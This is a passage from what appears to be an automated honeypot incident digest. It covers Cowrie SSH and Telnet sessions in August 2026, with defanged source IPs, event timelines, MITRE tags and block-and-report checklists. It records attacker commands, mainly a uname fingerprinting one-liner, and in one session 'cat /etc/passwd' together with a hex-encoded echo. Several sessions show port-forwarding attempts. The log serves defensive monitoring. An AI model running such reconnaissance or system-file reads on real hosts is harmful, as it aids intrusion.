| `2026-08-04 04:10:57` | `cowrie.command.input` |
| `2026-08-04 04:10:57` | `cowrie.command.input` |
| `2026-08-04 04:10:57` | `cowrie.command.input` |
| `2026-08-04 04:10:57` | `cowrie.log.closed` |
| `2026-08-04 04:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e727c40bf8c

| Field | Detail |
|---|---|
| **Source IP** | `113.240.142[.]218` |
| **First Seen** | 2026-08-04 04:12 |
| **Last Seen** | 2026-08-04 04:16 |
| **Session Duration** | 264s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:12:15` | `cowrie.session.connect` |
| `2026-08-04 04:12:15` | `cowrie.client.version` |
| `2026-08-04 04:12:17` | `cowrie.client.kex` |
| `2026-08-04 04:12:18` | `cowrie.login.success` |
| `2026-08-04 04:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.240.142[.]218` to AbuseIPDB if not already reported
- [ ] Block `113.240.142[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99ccd51ce7c1

| Field | Detail |
|---|---|
| **Source IP** | `113.240.142[.]218` |
| **First Seen** | 2026-08-04 04:12 |
| **Last Seen** | 2026-08-04 04:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:12:46` | `cowrie.session.connect` |
| `2026-08-04 04:12:46` | `cowrie.client.version` |
| `2026-08-04 04:12:47` | `cowrie.client.kex` |
| `2026-08-04 04:12:48` | `cowrie.login.success` |
| `2026-08-04 04:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.240.142[.]218` to AbuseIPDB if not already reported
- [ ] Block `113.240.142[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-749e3ca425e2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:12 |
| **Last Seen** | 2026-08-04 04:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:12:54` | `cowrie.session.connect` |
| `2026-08-04 04:12:55` | `cowrie.client.version` |
| `2026-08-04 04:12:55` | `cowrie.client.kex` |
| `2026-08-04 04:12:57` | `cowrie.login.success` |
| `2026-08-04 04:12:59` | `cowrie.session.params` |
| `2026-08-04 04:12:59` | `cowrie.command.input` |
| `2026-08-04 04:12:59` | `cowrie.command.input` |
| `2026-08-04 04:12:59` | `cowrie.command.input` |
| `2026-08-04 04:12:59` | `cowrie.command.input` |
| `2026-08-04 04:12:59` | `cowrie.command.input` |
| `2026-08-04 04:12:59` | `cowrie.command.success` |
| `2026-08-04 04:12:59` | `cowrie.command.input` |
| `2026-08-04 04:12:59` | `cowrie.command.input` |
| `2026-08-04 04:12:59` | `cowrie.command.input` |
| `2026-08-04 04:12:59` | `cowrie.command.input` |
| `2026-08-04 04:12:59` | `cowrie.log.closed` |
| `2026-08-04 04:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f1745d61866

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:16 |
| **Last Seen** | 2026-08-04 04:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:16:58` | `cowrie.session.connect` |
| `2026-08-04 04:16:59` | `cowrie.client.version` |
| `2026-08-04 04:16:59` | `cowrie.client.kex` |
| `2026-08-04 04:17:01` | `cowrie.login.success` |
| `2026-08-04 04:17:02` | `cowrie.session.params` |
| `2026-08-04 04:17:02` | `cowrie.command.input` |
| `2026-08-04 04:17:02` | `cowrie.command.input` |
| `2026-08-04 04:17:02` | `cowrie.command.input` |
| `2026-08-04 04:17:02` | `cowrie.command.input` |
| `2026-08-04 04:17:02` | `cowrie.command.input` |
| `2026-08-04 04:17:02` | `cowrie.command.success` |
| `2026-08-04 04:17:02` | `cowrie.command.input` |
| `2026-08-04 04:17:02` | `cowrie.command.input` |
| `2026-08-04 04:17:02` | `cowrie.command.input` |
| `2026-08-04 04:17:02` | `cowrie.command.input` |
| `2026-08-04 04:17:03` | `cowrie.log.closed` |
| `2026-08-04 04:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc11ac4f7983

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
| **First Seen** | 2026-08-04 04:17 |
| **Last Seen** | 2026-08-04 04:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:17:16` | `cowrie.session.connect` |
| `2026-08-04 04:17:18` | `cowrie.client.version` |
| `2026-08-04 04:17:18` | `cowrie.client.kex` |
| `2026-08-04 04:17:20` | `cowrie.login.success` |
| `2026-08-04 04:17:22` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-596a71f8178c

| Field | Detail |
|---|---|
| **Source IP** | `50.223.176[.]171` |
| **First Seen** | 2026-08-04 04:17 |
| **Last Seen** | 2026-08-04 04:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:17:31` | `cowrie.session.connect` |
| `2026-08-04 04:17:32` | `cowrie.client.version` |
| `2026-08-04 04:17:32` | `cowrie.client.kex` |
| `2026-08-04 04:17:34` | `cowrie.login.success` |
| `2026-08-04 04:17:34` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.223.176[.]171` to AbuseIPDB if not already reported
- [ ] Block `50.223.176[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c41c7b19953

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:18 |
| **Last Seen** | 2026-08-04 04:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:18:58` | `cowrie.session.connect` |
| `2026-08-04 04:18:58` | `cowrie.client.version` |
| `2026-08-04 04:18:58` | `cowrie.client.kex` |
| `2026-08-04 04:18:59` | `cowrie.login.success` |
| `2026-08-04 04:19:01` | `cowrie.session.params` |
| `2026-08-04 04:19:01` | `cowrie.command.input` |
| `2026-08-04 04:19:01` | `cowrie.command.input` |
| `2026-08-04 04:19:01` | `cowrie.command.input` |
| `2026-08-04 04:19:01` | `cowrie.command.input` |
| `2026-08-04 04:19:01` | `cowrie.command.input` |
| `2026-08-04 04:19:01` | `cowrie.command.success` |
| `2026-08-04 04:19:01` | `cowrie.command.input` |
| `2026-08-04 04:19:01` | `cowrie.command.input` |
| `2026-08-04 04:19:01` | `cowrie.command.input` |
| `2026-08-04 04:19:01` | `cowrie.command.input` |
| `2026-08-04 04:19:01` | `cowrie.log.closed` |
| `2026-08-04 04:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceef9409fecc

| Field | Detail |
|---|---|
| **Source IP** | `218.58.73[.]238` |
| **First Seen** | 2026-08-04 04:19 |
| **Last Seen** | 2026-08-04 04:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:19:35` | `cowrie.session.connect` |
| `2026-08-04 04:19:36` | `cowrie.client.version` |
| `2026-08-04 04:19:36` | `cowrie.client.kex` |
| `2026-08-04 04:19:38` | `cowrie.login.success` |
| `2026-08-04 04:19:38` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.58.73[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.58.73[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cb5472c7ce1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:20 |
| **Last Seen** | 2026-08-04 04:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:20:58` | `cowrie.session.connect` |
| `2026-08-04 04:20:58` | `cowrie.client.version` |
| `2026-08-04 04:20:58` | `cowrie.client.kex` |
| `2026-08-04 04:20:59` | `cowrie.login.success` |
| `2026-08-04 04:21:01` | `cowrie.session.params` |
| `2026-08-04 04:21:01` | `cowrie.command.input` |
| `2026-08-04 04:21:01` | `cowrie.command.input` |
| `2026-08-04 04:21:01` | `cowrie.command.input` |
| `2026-08-04 04:21:01` | `cowrie.command.input` |
| `2026-08-04 04:21:01` | `cowrie.command.input` |
| `2026-08-04 04:21:01` | `cowrie.command.success` |
| `2026-08-04 04:21:01` | `cowrie.command.input` |
| `2026-08-04 04:21:01` | `cowrie.command.input` |
| `2026-08-04 04:21:01` | `cowrie.command.input` |
| `2026-08-04 04:21:01` | `cowrie.command.input` |
| `2026-08-04 04:21:01` | `cowrie.log.closed` |
| `2026-08-04 04:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01afccd314d4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:22 |
| **Last Seen** | 2026-08-04 04:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:22:59` | `cowrie.session.connect` |
| `2026-08-04 04:22:59` | `cowrie.client.version` |
| `2026-08-04 04:22:59` | `cowrie.client.kex` |
| `2026-08-04 04:23:00` | `cowrie.login.success` |
| `2026-08-04 04:23:01` | `cowrie.session.params` |
| `2026-08-04 04:23:01` | `cowrie.command.input` |
| `2026-08-04 04:23:01` | `cowrie.command.input` |
| `2026-08-04 04:23:01` | `cowrie.command.input` |
| `2026-08-04 04:23:01` | `cowrie.command.input` |
| `2026-08-04 04:23:01` | `cowrie.command.input` |
| `2026-08-04 04:23:01` | `cowrie.command.success` |
| `2026-08-04 04:23:01` | `cowrie.command.input` |
| `2026-08-04 04:23:01` | `cowrie.command.input` |
| `2026-08-04 04:23:01` | `cowrie.command.input` |
| `2026-08-04 04:23:01` | `cowrie.command.input` |
| `2026-08-04 04:23:01` | `cowrie.log.closed` |
| `2026-08-04 04:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89f4b72600b8

| Field | Detail |
|---|---|
| **Source IP** | `220.197.14[.]60` |
| **First Seen** | 2026-08-04 04:23 |
| **Last Seen** | 2026-08-04 04:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:23:27` | `cowrie.session.connect` |
| `2026-08-04 04:23:28` | `cowrie.telnet.option` |
| `2026-08-04 04:23:28` | `cowrie.telnet.option` |
| `2026-08-04 04:23:28` | `cowrie.login.success` |
| `2026-08-04 04:23:29` | `cowrie.session.params` |
| `2026-08-04 04:23:29` | `cowrie.telnet.option` |
| `2026-08-04 04:23:29` | `cowrie.telnet.option` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:29` | `cowrie.command.failed` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:29` | `cowrie.command.failed` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:29` | `cowrie.command.failed` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:29` | `cowrie.command.input` |
| `2026-08-04 04:23:30` | `cowrie.log.closed` |
| `2026-08-04 04:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.197.14[.]60` to AbuseIPDB if not already reported
- [ ] Block `220.197.14[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df0638756308

| Field | Detail |
|---|---|
| **Source IP** | `171.217.70[.]151` |
| **First Seen** | 2026-08-04 04:24 |
| **Last Seen** | 2026-08-04 04:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:24:46` | `cowrie.session.connect` |
| `2026-08-04 04:24:47` | `cowrie.client.version` |
| `2026-08-04 04:24:47` | `cowrie.client.kex` |
| `2026-08-04 04:24:50` | `cowrie.login.success` |
| `2026-08-04 04:24:51` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.217.70[.]151` to AbuseIPDB if not already reported
- [ ] Block `171.217.70[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ccf0b7775bc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:25 |
| **Last Seen** | 2026-08-04 04:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:25:00` | `cowrie.session.connect` |
| `2026-08-04 04:25:00` | `cowrie.client.version` |
| `2026-08-04 04:25:00` | `cowrie.client.kex` |
| `2026-08-04 04:25:01` | `cowrie.login.success` |
| `2026-08-04 04:25:03` | `cowrie.session.params` |
| `2026-08-04 04:25:03` | `cowrie.command.input` |
| `2026-08-04 04:25:03` | `cowrie.command.input` |
| `2026-08-04 04:25:03` | `cowrie.command.input` |
| `2026-08-04 04:25:03` | `cowrie.command.input` |
| `2026-08-04 04:25:03` | `cowrie.command.input` |
| `2026-08-04 04:25:03` | `cowrie.command.success` |
| `2026-08-04 04:25:03` | `cowrie.command.input` |
| `2026-08-04 04:25:03` | `cowrie.command.input` |
| `2026-08-04 04:25:03` | `cowrie.command.input` |
| `2026-08-04 04:25:03` | `cowrie.command.input` |
| `2026-08-04 04:25:03` | `cowrie.log.closed` |
| `2026-08-04 04:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af8a6ea13a2

| Field | Detail |
|---|---|
| **Source IP** | `141.253.107[.]23` |
| **First Seen** | 2026-08-04 04:25 |
| **Last Seen** | 2026-08-04 04:25 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:25:15` | `cowrie.session.connect` |
| `2026-08-04 04:25:15` | `cowrie.client.version` |
| `2026-08-04 04:25:15` | `cowrie.client.kex` |
| `2026-08-04 04:25:15` | `cowrie.login.success` |
| `2026-08-04 04:25:16` | `cowrie.client.size` |
| `2026-08-04 04:25:16` | `cowrie.session.params` |
| `2026-08-04 04:25:16` | `cowrie.command.input` |
| `2026-08-04 04:25:29` | `cowrie.log.closed` |
| `2026-08-04 04:25:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.253.107[.]23` to AbuseIPDB if not already reported
- [ ] Block `141.253.107[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-050c72c7ae29

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:27 |
| **Last Seen** | 2026-08-04 04:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:27:06` | `cowrie.session.connect` |
| `2026-08-04 04:27:06` | `cowrie.client.version` |
| `2026-08-04 04:27:06` | `cowrie.client.kex` |
| `2026-08-04 04:27:07` | `cowrie.login.success` |
| `2026-08-04 04:27:09` | `cowrie.session.params` |
| `2026-08-04 04:27:09` | `cowrie.command.input` |
| `2026-08-04 04:27:09` | `cowrie.command.input` |
| `2026-08-04 04:27:09` | `cowrie.command.input` |
| `2026-08-04 04:27:09` | `cowrie.command.input` |
| `2026-08-04 04:27:09` | `cowrie.command.input` |
| `2026-08-04 04:27:09` | `cowrie.command.success` |
| `2026-08-04 04:27:09` | `cowrie.command.input` |
| `2026-08-04 04:27:09` | `cowrie.command.input` |
| `2026-08-04 04:27:09` | `cowrie.command.input` |
| `2026-08-04 04:27:09` | `cowrie.command.input` |
| `2026-08-04 04:27:09` | `cowrie.log.closed` |
| `2026-08-04 04:27:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-579163acf63a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:29 |
| **Last Seen** | 2026-08-04 04:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:29:06` | `cowrie.session.connect` |
| `2026-08-04 04:29:07` | `cowrie.client.version` |
| `2026-08-04 04:29:07` | `cowrie.client.kex` |
| `2026-08-04 04:29:08` | `cowrie.login.success` |
| `2026-08-04 04:29:10` | `cowrie.session.params` |
| `2026-08-04 04:29:10` | `cowrie.command.input` |
| `2026-08-04 04:29:10` | `cowrie.command.input` |
| `2026-08-04 04:29:10` | `cowrie.command.input` |
| `2026-08-04 04:29:10` | `cowrie.command.input` |
| `2026-08-04 04:29:10` | `cowrie.command.input` |
| `2026-08-04 04:29:10` | `cowrie.command.success` |
| `2026-08-04 04:29:10` | `cowrie.command.input` |
| `2026-08-04 04:29:10` | `cowrie.command.input` |
| `2026-08-04 04:29:10` | `cowrie.command.input` |
| `2026-08-04 04:29:10` | `cowrie.command.input` |
| `2026-08-04 04:29:10` | `cowrie.log.closed` |
